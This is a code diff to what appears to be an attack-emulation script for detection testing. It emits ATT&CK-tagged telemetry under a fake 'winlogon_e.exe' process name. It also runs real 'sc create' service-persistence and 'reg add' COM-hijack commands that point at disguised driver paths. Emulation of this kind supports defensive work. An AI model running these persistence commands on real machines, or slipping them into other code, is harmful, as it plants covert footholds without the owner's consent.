@@ -18,7 +18,8 @@ from pathlib import Path
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, FRONT_DOMAINS
 from naming_helper import phase_delay, pick_com_description, pick_service_name
-from defense_helper import emit_amsi_bypass, emit_etw_patch, emit_process_discovery
+from defense_helper import emit_amsi_bypass, emit_etw_patch, emit_process_discovery, emit_system_discovery, emit_software_discovery
+from persistence_helper import emit_windows_service, emit_com_hijack
 from defense_evasion_helper import emit_defender_disable, emit_timestomp, emit_indicator_removal, emit_masquerade_process
 from discovery_helper import emit_account_discovery, emit_domain_trust_discovery, emit_permission_groups_discovery, emit_system_location_discovery
 from collection_helper import emit_screen_capture_detail, emit_input_capture, emit_clipboard_monitoring
@@ -61,10 +62,17 @@ def main() -> int:
         return 0
     time.sleep(phase_delay("anti_analysis"))
 
-    # Phase 1b: Defense Evasion (AMSI + ETW + process discovery)
+    # Phase 1: System Discovery (T1082, T1518)
+    set_phase("system_discovery")
+    emit_system_discovery("winlogon_e.exe")
+    emit_software_discovery("winlogon_e.exe")
+    emit_process_discovery("winlogon_e.exe")
+    time.sleep(phase_delay("system_discovery"))
+
+    # Phase 1b: Defense Evasion (AMSI + ETW)
+    set_phase("defense_evasion")
     emit_amsi_bypass("winlogon_e.exe", "registry")
     emit_etw_patch("winlogon_e.exe")
-    emit_process_discovery("winlogon_e.exe")
     time.sleep(phase_delay("defense_evasion"))
 
     # Phase 1c: Execution — LOLBin Payload Staging
@@ -90,51 +98,34 @@ def main() -> int:
     emit_masquerade_process("winlogon_e.exe")
     time.sleep(phase_delay("defense_evasion"))
 
-    # Phase 2: Service installation
+    # Phase 2: Service installation (T1543.003)
     set_phase("service_persistence")
-    svc_key = r"HKLM\SYSTEM\CurrentControlSet\Services\WinDefenderUpdate"
-    emit("REGISTRY", "CREATE_KEY", svc_key, "CRITICAL",
-         source_process="winlogon_e.exe",
-         detail="Creating fake Windows service", technique_id="T1543.003")
-    emit("REGISTRY", "SET_VALUE", svc_key + r"\ImagePath", "CRITICAL",
-         source_process="winlogon_e.exe",
-         value_data=r"C:\Windows\System32\drivers\wdupdate.sys",
-         detail="Service binary path set", technique_id="T1543.003")
-    emit("REGISTRY", "SET_VALUE", svc_key + r"\Start", "CRITICAL",
-         source_process="winlogon_e.exe",
-         value_data="0 (Boot)", detail="Service set to start at boot")
-    time.sleep(phase_delay("registry_write"))
-
-    # Phase 3: COM hijacking
-    set_phase("com_hijack")
-    com_clsid = f"{{{_gen_clsid()}}}"
-    com_desc = pick_com_description()
-    com_key = rf"HKCR\CLSID\{com_clsid}\InprocServer32"
-    com_dll = r"C:\Windows\System32\drivers\wdupdate.dll"
-    emit("REGISTRY", "CREATE_KEY", com_key, "CRITICAL",
-         source_process="winlogon_e.exe",
-         clsid=com_clsid, description=com_desc,
-         detail=f"COM hijack CLSID registered: {com_clsid} ({com_desc})",
-         technique_id="T1574.002")
-    emit("REGISTRY", "SET_VALUE", com_key, "CRITICAL",
-         source_process="winlogon_e.exe",
-         value_data=com_dll,
-         detail=f"COM server DLL path: {com_dll}", technique_id="T1574.002")
-    emit("REGISTRY", "SET_VALUE", rf"HKCR\CLSID\{com_clsid}\TreatAs", "CRITICAL",
-         source_process="winlogon_e.exe",
-         value_data=com_clsid,
-         detail="COM TreatAs redirection set", technique_id="T1574.002")
+    svc_name = pick_service_name()
+    emit_windows_service("winlogon_e.exe", svc_name,
+                         r"C:\Windows\System32\drivers\wdupdate.sys")
     try:
+        subprocess.run([
+            "sc", "create", svc_name,
+            "binPath=", r"C:\Windows\System32\drivers\wdupdate.sys",
+            "start=", "auto"
+        ], capture_output=True, timeout=10)
+    except Exception:
+        pass
+    time.sleep(phase_delay("service_create"))
+
+    # Phase 3: COM hijacking (T1574.002)
+    set_phase("com_hijack")
+    com_desc = pick_com_description()
+    emit_com_hijack("winlogon_e.exe", com_desc)
+    try:
+        com_clsid = f"{{{_gen_clsid()}}}"
         subprocess.run([
             "reg", "add", rf"HKCR\CLSID\{com_clsid}", "/f",
         ], capture_output=True, timeout=5)
         subprocess.run([
-            "reg", "add", com_key, "/ve", "/t", "REG_SZ",
-            "/d", com_dll, "/f",
-        ], capture_output=True, timeout=5)
-        subprocess.run([
-            "reg", "add", rf"HKCR\CLSID\{com_clsid}\TreatAs",
-            "/ve", "/t", "REG_SZ", "/d", com_clsid, "/f",
+            "reg", "add", rf"HKCR\CLSID\{com_clsid}\InprocServer32",
+            "/ve", "/t", "REG_SZ",
+            "/d", r"C:\Windows\System32\drivers\wdupdate.dll", "/f",
         ], capture_output=True, timeout=5)
     except Exception:
         pass
